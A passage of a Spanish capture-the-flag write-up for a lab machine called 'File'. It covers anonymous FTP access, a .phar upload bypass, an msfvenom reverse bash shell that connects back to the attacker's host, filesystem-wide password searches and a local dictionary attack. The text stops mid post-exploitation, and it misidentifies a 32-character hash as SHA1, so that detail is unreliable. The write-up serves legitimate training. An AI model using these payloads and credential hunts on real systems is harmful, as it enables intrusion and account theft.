# File  

> Dificultad: Fácil

___

#### FASE RECOPILACIÓN    

Primero hacemos un Escaneo de Objetivo. Para ello, usamos nmap:  

`nmap -v -n --open -sV -sC --min-rate 5000 -oN escaneo <IP>`  

Vemos que el puerto 80 y 21 están abiertos, que trata de un Ubuntu con Apache 2.4.41 y FTP con usuario anónimo habilitado, respectivamente.  

Ahora, vamos a Enumerar los Servicios.  

Primero el FTP. Corremos: `ftp <IP>` e ingresamos `Anonymous` en el campo de usuario. Al pedir la password, sólo presionamos `Enter` y listo, estamos dentro del servidor FTP. Ahora lanzamos `dir` o `ls` y vemos el contenido del directorio `/var/ftp/`.  

Vemos que hay un archivo interesante llamado "anon.txt" el cual descargamos localmente con `get anon.txt`. Ahora, en nuestro equipo, hacemos un `cat anon.txt` y nos devuelve un hash `53dd9c6005f3cdfc5a69c5c07388016d`. Para saber primero el tipo de hash corremos `hashid <hash>` en nuestro Linux y notamos que es un `SHA1` el cual es muy poco seguro y fácil de crackear.  

Entonces ahora, vamos a la página https://crackstation.net/, ingresamos nuestro hash y obtenemos que descodificado es `justin`. Por el momento, eso es todo con respecto a FTP.  

Ahora Enumeremos el servicio Web:  

Primero los Directorios. Usamos `wfuzz`:  

 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -R 3 -u "http://<IP>/FUZZ"`  

 Obtenemos uno solo de relevacia:
 
 * /uploads  

Ahora, los Recursos. En este caso, buscamos PHP, HTML y TXT:  

`wfuzz -c --hc 404 -t 200 -z list,"php-html-txt" -u "http://<IP>/FUZZ"`  

Encontramos 3:  

* /file_upload.php
* /subir_archivos.php
* /index.html

___

#### FASE EXPLOTACIÓN (Ganar Acesso):  

Una vez Enumerados todos los Servicios. Pasamos a intentar Ganar Acceso. Pareciera que el camino para lograrlo es intentar subir un archivo malicioso de alguna manera. Por lo tanto, pasamos a descargar los recursos PHP que son los que tienen la lógica de dicha función. Lo hacemos de la siguiente manera:  

* `curl -O http://<IP>/file_upload.php`
* `curl -O http://<IP>/subir_archivo.php`

Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, intentamos con archivos `.phar` y tenemos éxito.  

> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa de correr una WebShell.

Ahora, teniendo en cuenta esto, pasamos a crear la webshell con msfvemom:  

`msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  

> Usamos dicho payload para poder recibir la conexión con alguna otra herramienta alternativa a Meterpreter para variar.

Bien, una vez, creada nuestra WebShell, procedemos a subirla, tenemos éxito y nos dirigimos a /`uploads` donde verificamos la subida. Una vez confirmada, pasamos a preparar nuestro listener. En este caso, usamos Penélope (https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nuestro listener. Corremos y ejecutamos la webshell remota. Tenemos acceso.  

___

#### FASE POST-EXPLOTACIÓN  

Con un pie dentro, corremos `whoami` y verificamos que somos `www-data`.  

Lo primero que debemos hacer apenas entramos es Enumerar Usuarios. Lo hacemos de la siguiente manera:  

* `cat /etc/passwd`
* `ls -l /home`

Ahora podemos comprobar que los usuarios son 4:  

1. fernando
2. mario
3. julen
4. iker

Lo segundo es Buscar Credenciales en el sistema. Podemos hacerlo con:  

* `grep -RIin password / 2>/dev/null`
* `find / -type f -iname "password" 2>/dev/null | xargs ls -l`
* `grep -RIin -E "fernando|mario|julen|iker / 2>/dev/null`

> También podemos correr LinPEAS desde Penélope haciendo:
> `modules` ==> `run peass_ng`

> Además debemos buscar Binarios SUID y Privilegios Sudo para ver si podemos Escalar Privilegios desde www-data, por si acaso:
> * `find / -type f -perm -4000 2>/dev/null | xargs ls -l`
> * `sudo -l`

Una vez que nos damos cuenta que no conseguimos nada fácilmente, pasamos a crear un script para crackear usuarios mediante un Ataque de Diccionario. Yo usé el mío [aquí](https://github.com/cobrasecx/bruters/blob/main/bruter.sh). Probando varios diccionarios, conseguimos resultados finalmente: `fernando:chocolate`.  

> El diccionario ganador fue `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`

Una vez con estos datos, proseguimos con `su - fernando ==> chocolate` y conseguimos Movimiento Lateral. Ahora, como `fernando` vemos que no tenemos Permisos Sudo corriendo (`sudo -l`) ni Binarios SUID relevantes en el sistema.  

Ya habiendo probado algunas cosas, vemos que listando nuestro /home/fernando vemos un archivo de imagen llamado `dragon-medieval.jpeg` 
